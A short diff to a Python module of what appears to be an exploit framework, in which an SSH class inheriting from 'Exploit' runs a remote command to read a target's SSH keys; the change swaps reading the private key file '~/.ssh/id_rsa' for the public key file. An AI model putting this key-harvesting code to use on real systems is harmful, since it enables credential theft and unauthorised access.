@@ -1,6 +1,5 @@
 from hydra import Exploit
-from io import StringIO 
-import sys, paramiko, getpass
+import sys, paramiko
 
 class SSH(Exploit):
     def __init__(self):
@@ -25,7 +24,7 @@ class SSH(Exploit):
     
     def get_sshkeys(self, ssh, ip_address, username):
         try:
-            stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa')
+            stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa.pub')
         except:
             print("No SSH keys found.")
         else:
